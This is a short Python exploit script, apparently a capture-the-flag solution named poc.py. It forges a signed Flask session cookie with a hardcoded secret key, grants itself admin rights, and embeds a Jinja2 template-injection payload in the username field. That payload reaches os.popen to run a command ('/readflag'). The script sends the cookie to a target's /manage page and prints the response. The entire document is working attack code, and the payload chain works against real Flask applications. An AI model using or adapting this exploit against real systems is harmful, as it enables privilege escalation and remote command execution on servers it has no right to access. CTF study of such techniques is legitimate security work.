import requests
import string
import sys
from flask.sessions import SecureCookieSessionInterface
from itsdangerous import URLSafeTimedSerializer

class SimpleSecureCookieSessionInterface(SecureCookieSessionInterface):
	def get_signing_serializer(self, secret_key):
		if not secret_key:
			return None
		signer_kwargs = dict(
			key_derivation=self.key_derivation,
			digest_method=self.digest_method
		)
		return URLSafeTimedSerializer(secret_key, salt=self.salt,
		                              serializer=self.serializer,
		                              signer_kwargs=signer_kwargs)

def decodeFlaskCookie(secret_key, cookieValue):
	sscsi = SimpleSecureCookieSessionInterface()
	signingSerializer = sscsi.get_signing_serializer(secret_key)
	return signingSerializer.loads(cookieValue)

def encodeFlaskCookie(secret_key, cookieDict):
	sscsi = SimpleSecureCookieSessionInterface()
	signingSerializer = sscsi.get_signing_serializer(secret_key)
	return signingSerializer.dumps(cookieDict)


if len(sys.argv) < 2:
	print("[+] python3 poc.py <url>")
	exit()

URL = sys.argv[1]

SECRET_KEY = '476345fdc597d6cb6dd68ae949b2694a'
PAYLOAD = {u'is_admin':1,u'username':"""{%print(lipsum|attr("__globals__"))|attr("__getitem__")("os")|attr("popen")("/readflag")|attr("read")()%}"""}

def getSession():
	cookie = encodeFlaskCookie(SECRET_KEY, PAYLOAD)
	return cookie

def getFlag():
	cookies = {"session":getSession()}
	r = requests.get(url=URL+'/manage',cookies=cookies)
	print(r.text)


if __name__ == "__main__":
	getFlag()